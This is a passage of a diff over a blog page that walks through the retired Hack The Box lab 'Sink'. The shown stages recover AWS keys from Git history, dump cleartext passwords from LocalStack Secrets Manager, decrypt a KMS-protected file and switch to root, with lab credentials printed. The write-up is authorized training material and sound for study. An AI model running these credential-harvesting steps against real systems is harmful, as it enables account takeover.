 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code class="language-json" data-language="json">{"services": {"logs": "running", "secretsmanager": "running", "kms": "running"}}
+<pre tabindex="0" aria-label="json code or terminal block 33"><code class="language-json" data-language="json">{"services": {"logs": "running", "secretsmanager": "running", "kms": "running"}}
 </code></pre>
 <p>Three services are running:</p>
 <ul>
@@ -358,12 +360,12 @@ uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
 <h3 id="9-3-finding-aws-credentials">9.3 Finding AWS Credentials</h3>
 <p>We need an Access Key ID and Secret Access Key to interact with LocalStack. Where do we find them? In the Gitea repos, of course!</p>
 <p>In the <code>Log_Management</code> repo, we find <code>create_logs.php</code>. Looking at its commit history, the original version had hardcoded credentials:</p>
-<pre><code class="language-php" data-language="php">'key' =&gt; '[redacted retired-lab access key]',
+<pre tabindex="0" aria-label="php code or terminal block 34"><code class="language-php" data-language="php">'key' =&gt; '[redacted retired-lab access key]',
 'secret' =&gt; 'paVI8VgTWkPI3jDNkdzUMvK4CcdXO2T7sePX0ddF'
 </code></pre>
 
 <h3 id="9-4-configuring-aws-cli">9.4 Configuring AWS CLI</h3>
-<pre><code class="language-bash" data-language="bash">aws configure
+<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash">aws configure
 </code></pre>
 <p>Enter:</p>
 <ul>
@@ -376,10 +378,10 @@ uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
 <hr>
 <h2 id="10-pivoting-to-david-via-secrets-manager">10. Pivoting to David via Secrets Manager</h2>
 <h3 id="10-1-enumerating-secrets">10.1 Enumerating Secrets</h3>
-<pre><code class="language-bash" data-language="bash">awslocal secretsmanager list-secrets
+<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">awslocal secretsmanager list-secrets
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code class="language-json" data-language="json">{
+<pre tabindex="0" aria-label="json code or terminal block 37"><code class="language-json" data-language="json">{
     "SecretList": [
         {
             "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-cWfUq",
@@ -397,7 +399,7 @@ uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
 }
 </code></pre>
 <h3 id="10-2-extracting-secret-values">10.2 Extracting Secret Values</h3>
-<pre><code class="language-bash" data-language="bash">awslocal secretsmanager get-secret-value --secret-id "Jenkins Login"
+<pre tabindex="0" aria-label="bash code or terminal block 38"><code class="language-bash" data-language="bash">awslocal secretsmanager get-secret-value --secret-id "Jenkins Login"
 awslocal secretsmanager get-secret-value --secret-id "Sink Panel"
 awslocal secretsmanager get-secret-value --secret-id "Jira Support"
 </code></pre>
@@ -408,51 +410,51 @@ awslocal secretsmanager get-secret-value --secret-id "Jira Support"
 <li><strong>Jira Support:</strong> <code>david@sink.htb</code> / <code>EALB=bcC=</code>a7f2#k`</li>
 </ul>
 <h3 id="10-3-switching-to-david">10.3 Switching to David</h3>
-<pre><code class="language-bash" data-language="bash">su david
+<pre tabindex="0" aria-label="bash code or terminal block 39"><code class="language-bash" data-language="bash">su david
 </code></pre>
 <p>Enter: <code>EALB=bcC=</code>a7f2#k`</p>
 <p><strong>Success!</strong></p>
-<pre><code>david@sink:/home/marcus$ id
+<pre tabindex="0" aria-label="Code or terminal block 40"><code>david@sink:/home/marcus$ id
 uid=1000(david) gid=1000(david) groups=1000(david)
 </code></pre>
 <hr>
 <h2 id="11-privilege-escalation-kms-decryption">11. Privilege Escalation: KMS Decryption</h2>
 <h3 id="11-1-the-encrypted-file">11.1 The Encrypted File</h3>
 <p>In david's home directory:</p>
-<pre><code class="language-bash" data-language="bash">cd ~ &amp;&amp; find Projects/ -type f
+<pre tabindex="0" aria-label="bash code or terminal block 41"><code class="language-bash" data-language="bash">cd ~ &amp;&amp; find Projects/ -type f
 </code></pre>
 <p><strong>Output:</strong> <code>Projects/Prod_Deployment/servers.enc</code></p>
-<pre><code class="language-bash" data-language="bash">file Projects/Prod_Deployment/servers.enc
+<pre tabindex="0" aria-label="bash code or terminal block 42"><code class="language-bash" data-language="bash">file Projects/Prod_Deployment/servers.enc
 </code></pre>
 <p><strong>Output:</strong> <code>data</code></p>
 <p>This is an encrypted blob. We need to decrypt it.</p>
 <h3 id="11-2-kms-key-enumeration">11.2 KMS Key Enumeration</h3>
-<pre><code class="language-bash" data-language="bash">awslocal kms list-keys | grep KeyId | cut -d'"' -f4
+<pre tabindex="0" aria-label="bash code or terminal block 43"><code class="language-bash" data-language="bash">awslocal kms list-keys | grep KeyId | cut -d'"' -f4
 </code></pre>
 <p>We get 11 keys. We need the one that is:</p>
 <ol>
 <li><strong>Enabled</strong> (not Disabled)</li>
 <li>Has <strong>ENCRYPT_DECRYPT</strong> key usage</li>
 </ol>
-<pre><code class="language-bash" data-language="bash">awslocal kms list-keys | grep KeyId | cut -d'"' -f4 | while read id; do
+<pre tabindex="0" aria-label="bash code or terminal block 44"><code class="language-bash" data-language="bash">awslocal kms list-keys | grep KeyId | cut -d'"' -f4 | while read id; do
   desc=$(awslocal kms describe-key --key-id $id)
   use=$(echo $desc | cut -d'"' -f26)
   echo $desc | grep -q Disabled || echo "$id  $use"
 done
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>804125db-bdf1-465a-a058-07fc87c0fad0  ENCRYPT_DECRYPT
+<pre tabindex="0" aria-label="Code or terminal block 45"><code>804125db-bdf1-465a-a058-07fc87c0fad0  ENCRYPT_DECRYPT
 c5217c17-5675-42f7-a6ec-b5aa9b9dbbde  SIGN_VERIFY
 </code></pre>
 <p>Our target key is <code>804125db-bdf1-465a-a058-07fc87c0fad0</code>.</p>
 <h3 id="11-3-decrypting-the-file">11.3 Decrypting the File</h3>
-<pre><code class="language-bash" data-language="bash">awslocal kms decrypt \
+<pre tabindex="0" aria-label="bash code or terminal block 46"><code class="language-bash" data-language="bash">awslocal kms decrypt \
   --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 \
   --ciphertext-blob fileb://Projects/Prod_Deployment/servers.enc \
   --encryption-algorithm RSAES_OAEP_SHA_256
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code class="language-json" data-language="json">{
+<pre tabindex="0" aria-label="json code or terminal block 47"><code class="language-json" data-language="json">{
     "KeyId": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
     "Plaintext": "REDACTED_ENCODED_LAB_MATERIAL",
     "EncryptionAlgorithm": "RSAES_OAEP_SHA_256"
@@ -460,21 +462,21 @@ c5217c17-5675-42f7-a6ec-b5aa9b9dbbde  SIGN_VERIFY
 </code></pre>
 <h3 id="11-4-unpacking-the-decrypted-data">11.4 Unpacking the Decrypted Data</h3>
 <p>The <code>Plaintext</code> is base64-encoded. Decode it:</p>
-<pre><code class="language-bash" data-language="bash">echo "REDACTED_ENCODED_LAB_MATERIAL" | base64 -d &gt; servers.gz
+<pre tabindex="0" aria-label="bash code or terminal block 48"><code class="language-bash" data-language="bash">echo "REDACTED_ENCODED_LAB_MATERIAL" | base64 -d &gt; servers.gz
 </code></pre>
-<pre><code class="language-bash" data-language="bash">file servers.gz
+<pre tabindex="0" aria-label="bash code or terminal block 49"><code class="language-bash" data-language="bash">file servers.gz
 </code></pre>
 <p><strong>Output:</strong> <code>servers.gz: gzip compressed data</code></p>
-<pre><code class="language-bash" data-language="bash">zcat servers.gz &gt; servers.tar &amp;&amp; tar -xvf servers.tar
+<pre tabindex="0" aria-label="bash code or terminal block 50"><code class="language-bash" data-language="bash">zcat servers.gz &gt; servers.tar &amp;&amp; tar -xvf servers.tar
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>servers.yml
+<pre tabindex="0" aria-label="Code or terminal block 51"><code>servers.yml
 servers.sig
 </code></pre>
-<pre><code class="language-bash" data-language="bash">cat servers.yml
+<pre tabindex="0" aria-label="bash code or terminal block 52"><code class="language-bash" data-language="bash">cat servers.yml
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code class="language-yaml" data-language="yaml">server:
+<pre tabindex="0" aria-label="yaml code or terminal block 53"><code class="language-yaml" data-language="yaml">server:
   listenaddr: ""
   port: 80
   hosts:
@@ -488,15 +490,15 @@ defaultuser:
 <hr>
 <h2 id="12-root-shell-and-root-flag">12. Root Shell &amp; Root Flag</h2>
 <h3 id="12-1-becoming-root">12.1 Becoming Root</h3>
-<pre><code class="language-bash" data-language="bash">su -
+<pre tabindex="0" aria-label="bash code or terminal block 54"><code class="language-bash" data-language="bash">su -
 </code></pre>
 <p>Enter: <code>_uezduQ!EY5AHfe2</code></p>
 <p><strong>Success!</strong></p>
-<pre><code>root@sink:~# id
+<pre tabindex="0" aria-label="Code or terminal block 55"><code>root@sink:~# id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
 <h3 id="12-2-root-flag">12.2 Root Flag</h3>
-<pre><code class="language-bash" data-language="bash">cat /root/root.txt
+<pre tabindex="0" aria-label="bash code or terminal block 56"><code class="language-bash" data-language="bash">cat /root/root.txt
 </code></pre>
 <p><strong>Root Flag:</strong> <code>50339[redacted]252f459</code></p>
 <hr>
@@ -520,13 +522,13 @@ uid=0(root) gid=0(root) groups=0(root)
 <li><strong>Encrypted files are only as strong as key management.</strong> If the decryption key is accessible on the same machine, encryption is just obfuscation.</li>
 </ul>
 <h3 id="13-4-the-chain">13.4 The Chain</h3>
-<pre><code>HTTP Smuggle → Admin Cookie → Gitea Creds → SSH Key → User Shell
+<pre tabindex="0" aria-label="Code or terminal block 57"><code>HTTP Smuggle → Admin Cookie → Gitea Creds → SSH Key → User Shell
     → AWS Creds → Secrets Manager → David Password → KMS Decrypt → Root
 </code></pre>
 <p>Each recovered primitive supplied the input required by the next stage.</p>
-<hr>a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]
-b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-seventeen-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Seventeen Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:29:34.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-talkative-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Talkative Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:10:29.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-c:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-12:T567,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/#article","headline":"Hack The Box: Sink Walkthrough","description":"A CL.TE request-smuggling desync captured the admin session, Gitea history exposed Marcus's SSH key and LocalStack credentials, Secrets Manager supplied David's login, and KMS decrypted the file containing the root password.","url":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/","datePublished":"2026-06-11T11:23:19.000Z","dateModified":"2026-06-11T11:23:19.000Z","wordCount":2569,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/d21f05db0cf91e7d865ffa5809e0c6269716449d/HTB-Sink.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-sink-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Sink Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
-e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
-15:null
+<hr>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"1-approach-to-sink","label":"1. Approach to Sink"},{"id":"2-initial-reconnaissance","label":"2. Initial Reconnaissance"},{"id":"3-understanding-the-attack-surface-port-5000","label":"3. Understanding the Attack Surface: Port 5000"},{"id":"http-request-smuggling","label":"HTTP Request Smuggling"},{"id":"5-capturing-the-admin-cookie","label":"5. Capturing the Admin Cookie"},{"id":"6-accessing-admin-notes-and-credential-harvesting","label":"6. Accessing Admin Notes & Credential Harvesting"},{"id":"7-gitea-enumeration-and-ssh-key-extraction","label":"7. Gitea Enumeration & SSH Key Extraction"},{"id":"8-shell-as-marcus-and-user-flag","label":"8. Shell as Marcus & User Flag"},{"id":"9-aws-localstack-enumeration","label":"9. AWS LocalStack Enumeration"},{"id":"10-pivoting-to-david-via-secrets-manager","label":"10. Pivoting to David via Secrets Manager"},{"id":"11-privilege-escalation-kms-decryption","label":"11. Privilege Escalation: KMS Decryption"},{"id":"12-root-shell-and-root-flag","label":"12. Root Shell & Root Flag"},{"id":"13-key-lessons-and-takeaways","label":"13. Key Lessons & Takeaways"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/d21f05db0cf91e7d865ffa5809e0c6269716449d/HTB-Sink.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit d21f05db0cf9",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Sink, Linux, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sink","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-seventeen-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Seventeen Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:29:34.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-talkative-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Talkative Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:10:29.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T567,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/#article","headline":"Hack The Box: Sink Walkthrough","description":"A CL.TE request-smuggling desync captured the admin session, Gitea history exposed Marcus's SSH key and LocalStack credentials, Secrets Manager supplied David's login, and KMS decrypted the file containing the root password.","url":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/","datePublished":"2026-06-11T11:23:19.000Z","dateModified":"2026-06-11T11:23:19.000Z","wordCount":2569,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/d21f05db0cf91e7d865ffa5809e0c6269716449d/HTB-Sink.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-sink-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Sink Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-sink-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
